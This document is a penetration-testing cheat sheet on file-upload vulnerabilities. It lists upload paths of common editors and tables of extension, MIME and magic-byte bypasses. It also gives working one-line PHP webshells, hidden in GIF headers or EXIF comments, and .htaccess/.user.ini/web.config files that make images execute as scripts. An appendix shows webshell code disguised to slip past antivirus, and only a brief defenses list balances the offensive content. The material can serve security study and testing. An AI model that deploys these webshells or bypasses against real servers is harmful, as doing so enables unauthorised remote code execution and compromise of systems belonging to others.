# Web Security - File-Upload Vulnerabilities

> Source: WooYun vulnerability database | split from web-file-infra.md

## 1. File-Upload Vulnerabilities

### 1.1 Nature of the Vulnerability

```
Attack chain: find the upload point → bypass detection → obtain the path → exploit parsing → run the webshell
Success rate = P(bypass detection) × P(obtain the path) × P(parse and run)
```

Core tension: functional need (allow uploads) vs security need (restrict execution). Most defenses focus only on "bypass detection" and ignore path disclosure and parsing configuration.

### 1.2 Upload-Point Identification

| Upload-point type | frequency | risk | typical path |
|-----------|------|------|---------|
| Rich-text editor | 42% | very high | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| Avatar upload | 18% | high | `/upload/avatar/`, `/member/uploadfile/` |
| Attachments/documents | 15% | high | `/uploads/`, `/attachment/` |
| Admin features | 12% | very high | `/admin/upload/`, `/system/upload/` |
| Import feature | 5% | high | `/import/`, `/excelUpload/` |

Editor test paths:

| Editor | test path | upload endpoint |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

### 1.3 Bypass Techniques - Extension

Blacklist-bypass quick reference:

| Technique | PHP | ASP/ASPX | JSP |
|-----|-----|----------|-----|
| Case | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| Double-write | `.pphphp` | `.asaspp` | `.jsjspp` |
| Special suffixes | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| Space/dot | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| %00 truncation | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| Semicolon (IIS) | N/A | `.asp;.jpg` | N/A |
| Newline (Apache) | `.php\x0a` | N/A | N/A |

Whitelist-bypass methods:

| Technique | principle | condition |
|-----|------|------|
| Parsing vulnerability | upload a whitelisted file that gets parsed specially | IIS/Apache/Nginx vulnerabilities |
| Apache multi-suffix | `shell.php.jpg` is parsed as php | Apache multi-suffix config |
| %00 truncation | `shell.php%00.jpg` | PHP < 5.3.4 |
| Config-file upload | upload `.htaccess`/`.user.ini` | txt/config files are allowed |
| Image-webshell + LFI | upload an image-embedded webshell combined with file inclusion | an LFI vulnerability exists |

### 1.4 Bypass Techniques - MIME/Content-Type

```
Change the Content-Type to one of the following to bypass:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (generic)

Burp intercept-and-modify example:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- key modification point
```

### 1.5 Bypass Techniques - File Header / Content Detection

Common file magic numbers:

| Type | magic number (hex) | ASCII |
|-----|-------------------|-------|
| JPEG | `FF D8 FF` | no readable ASCII |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

Crafting an image-embedded webshell:

```bash
# Method 1: simply add a file header
GIF89a<?php system($_POST['cmd']); ?>

# Method 2: merge files
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# Method 3: EXIF injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 1.6 Web-Server Parsing Vulnerabilities

```
IIS 5.x/6.0:
  Directory parsing: /shell.asp/1.jpg     -> parsed as ASP
  File parsing: shell.asp;.jpg       -> parsed as ASP
  Malformed parsing: shell.asp.jpg        -> may be parsed as ASP

Apache:
  Multi-suffix: shell.php.xxx          -> parsed right-to-left
  .htaccess: AddType application/x-httpd-php .jpg
  Newline parsing: shell.php%0a         -> CVE-2017-15715

Nginx:
  Malformed parsing: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
  Null byte: shell.jpg%00.php       -> old-version vulnerability

Tomcat:
  PUT method: PUT /shell.jsp/       -> CVE-2017-12615
```

### 1.7 Config-File Parsing Hijack

```apache
# .htaccess: make jpg be parsed as PHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): auto-include the image-embedded webshell
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS): make jpg be handled by FastCGI -->
<handlers>
  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 Race-Condition Exploitation

```
Principle: there is a time gap between upload and deletion
Exploitation: multi-threaded upload + access, run malicious code before deletion
Tip: have the malicious file first create a new file elsewhere, so the new file is not removed by the cleanup mechanism
```

### 1.9 Defenses

1. Whitelist validation: allow only specific extensions (`.jpg .png .gif .pdf`)
2. Multi-layer validation: extension + MIME (finfo_file) + file header + getimagesize()
3. File renaming: `uniqid() + fixed extension`, completely removing the original file name
4. Forbid execution: deny script-execution permission on the upload directory
5. Least privilege: `chmod 0644`, not executable by the web user
6. Check before store: validate before storing, using atomic operations to prevent races
7. Path hiding: do not return the full path; use a CDN or randomized URLs

---


---
## Appendix: Webshell AV-Evasion Quick Reference

## Appendix B: Webshell AV-Evasion Quick Reference

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // variable concatenation
array_map('ass'.'ert', array($_POST['x']));            // callback function
$f = create_function('', $_POST['x']); $f();           // dynamic function
set_exception_handler('system');                        // exception handling
throw new Exception($_POST['cmd']);
```

